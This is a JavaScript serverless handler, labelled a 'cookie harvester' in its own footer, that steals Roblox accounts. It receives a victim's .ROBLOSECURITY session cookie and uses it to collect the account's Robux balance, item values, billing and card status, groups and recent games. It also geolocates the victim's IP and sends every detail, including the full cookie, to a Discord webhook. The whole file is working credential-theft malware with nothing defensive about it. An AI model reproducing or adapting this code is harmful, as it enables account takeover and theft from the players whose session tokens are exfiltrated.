// api/submit.js
const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ---------- Helper functions ----------
async function getUser(userId, cookie) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("User fetch failed");
  return await res.json();
}

function getAgeDays(createdDate) {
  return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
}

async function getRobux(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Robux fetch failed");
  const data = await res.json();
  return { balance: data.robux || 0, pending: 0 };
}

async function getRapAndOwned(userId, cookie) {
  let allAssets = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets?assetTypeId=2&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    allAssets.push(...(data.data || []));
    cursor = data.nextPageCursor;
  } while (cursor);

  let totalRap = 0;
  for (const asset of allAssets) {
    try {
      const detail = await fetch(`https://economy.roblox.com/v1/assets/${asset.assetId}/details`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      if (detail.ok) {
        const json = await detail.json();
        totalRap += json.RecentAveragePrice || 0;
      }
      await new Promise(r => setTimeout(r, 30));
    } catch (e) {
      console.warn(`RAP fetch failed for ${asset.assetId}:`, e.message);
    }
  }
  return { rap: totalRap, owned: allAssets.length };
}

async function getBilling(cookie) {
  const defaultBilling = { credit: 0, convert: 0, card: "False" };
  try {
    const res = await fetch("https://www.roblox.com/billing/user/credit", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return defaultBilling;
    const html = await res.text();
    const creditMatch = html.match(/"creditAmount":(\d+)/);
    const convertMatch = html.match(/"convertedRobux":(\d+)/);
    const hasCard = html.includes('"isCardLinked":true');
    return {
      credit: creditMatch ? parseInt(creditMatch[1], 10) : 0,
      convert: convertMatch ? parseInt(convertMatch[1], 10) : 0,
      card: hasCard ? "True" : "False"
    };
  } catch (e) {
    return defaultBilling;
  }
}

async function getSettings(cookie) {
  const defaultSettings = { verified: "False", disabled: "False", enabled: "False" };
  try {
    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return defaultSettings;
    const data = await res.json();
    return {
      verified: data.IsVerified ? "True" : "False",
      disabled: data.IsDisabled ? "True" : "False",
      enabled: data.Email ? "True" : "False"
    };
  } catch (e) {
    return defaultSettings;
  }
}

async function getGroups(userId, cookie) {
  try {
    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return { owned: 0, funds: 0 };
    const data = await res.json();
    const owned = data.data?.length || 0;
    return { owned, funds: 0 };
  } catch (e) {
    return { owned: 0, funds: 0 };
  }
}

async function getCollectibles() {
  return ["False", "False", "False"];
}

// ----- Recently Played Games (real API) -----
async function getRecentlyPlayedGames(userId, cookie) {
  // Official Roblox endpoint for recent games (requires no extra auth)
  const url = `https://games.roblox.com/v1/users/${userId}/recent-games?limit=50`;
  const res = await fetch(url, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) return [];

  const data = await res.json();
  return (data.data || []).map(game => game.name);
}

async function getPlayedPasses(userId, cookie) {
  const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
  const recentGames = await getRecentlyPlayedGames(userId, cookie);
  return targetGames.map(name => {
    const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
    return { name, played: played ? "True" : "False", passes: 0 };
  });
}

// ----- Country flag (unicode) -----
async function getCountryFlag(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  if (!ip || ip === '::1') return '🏠 Local';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
    const data = await geoRes.json();
    if (data.status === 'success' && data.countryCode) {
      const code = data.countryCode;
      // Convert country code to unicode flag emoji (e.g., US -> 🇺🇸)
      const flag = code.split('').map(letter =>
        String.fromCodePoint(letter.charCodeAt(0) + 127397)
      ).join('');
      return `${flag} ${code}`;
    }
  } catch (e) {}
  return '🌍 Unknown';
}

// ----- Avatar image URL -----
async function getUserAvatarUrl(userId, cookie) {
  try {
    const res = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
    );
    if (!res.ok) return null;
    const data = await res.json();
    return data.data?.[0]?.imageUrl || null;
  } catch (e) {
    return null;
  }
}

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });

  try {
    // Parallel fetch
    const [userData, robux, rapData, billing, settings, groups, playedPasses, collectibles, countryFlag, avatarUrl] = await Promise.all([
      getUser(rbxuid, cookie),
      getRobux(rbxuid, cookie),
      getRapAndOwned(rbxuid, cookie),
      getBilling(cookie),
      getSettings(cookie),
      getGroups(rbxuid, cookie),
      getPlayedPasses(rbxuid, cookie),
      getCollectibles(),
      getCountryFlag(req),
      getUserAvatarUrl(rbxuid, cookie)
    ]);

    const accountAge = getAgeDays(userData.created);
    const summary = robux.balance + rapData.rap;
    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
    const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
    const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
    const robuxEmoji = "<:Robux:1495081542370726080>"; // make sure this emoji exists in your webhook's server

    // Embed 1: Stats (with avatar as image)
    const statsEmbed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      image: avatarUrl ? { url: avatarUrl } : undefined,  // shows avatar below fields
      fields: [
        {
          name: "📌 About User",
          value: `**${userData.name}** (**${userData.displayName}**)\n**UserID:** \`${userData.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** 0\n**Country:** ${countryFlag}`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `${robuxEmoji} **Balance:** ${robux.balance}\n${robuxEmoji} **Pending:** ${robux.pending}`,
          inline: true
        },
        {
          name: "💳 Billing",
          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
          inline: true
        },
        {
          name: "📊 Rap",
          value: `**Rap:** ${rapData.rap}\n**Owned:** ${rapData.owned}`,
          inline: true
        },
        {
          name: "📊 Played | Passes",
          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
          inline: false
        },
        {
          name: "📝 Summary",
          value: `**${summary}**`,
          inline: false
        },
        {
          name: "📊 Settings",
          value: `**(Verified)** ${settings.verified}\n**Disabled** ${settings.disabled}\n**Enabled** ${settings.enabled}`,
          inline: true
        },
        {
          name: "📊 Collectibles",
          value: collectibles.map(c => `**${c}**`).join("\n"),
          inline: true
        },
        {
          name: "📊 Groups",
          value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
          inline: true
        },
        {
          name: "🔗 Rolimons Profile",
          value: `[Click here](${rolimonsLink})`,
          inline: false
        }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // Embed 2: Cookie (bold+italic title, no warning)
    const cookieEmbed = {
      title: "🍪 ***.ROBLOSECURITY***",
      description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // Send stats embed with @everyone ping
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        username: "Vyro Harvest",
        embeds: [statsEmbed]
      })
    });

    // Send cookie embed
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Vyro Harvest",
        embeds: [cookieEmbed]
      })
    });

    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error("Harvest error:", err);
    return res.status(500).json({ error: err.message });
  }
}
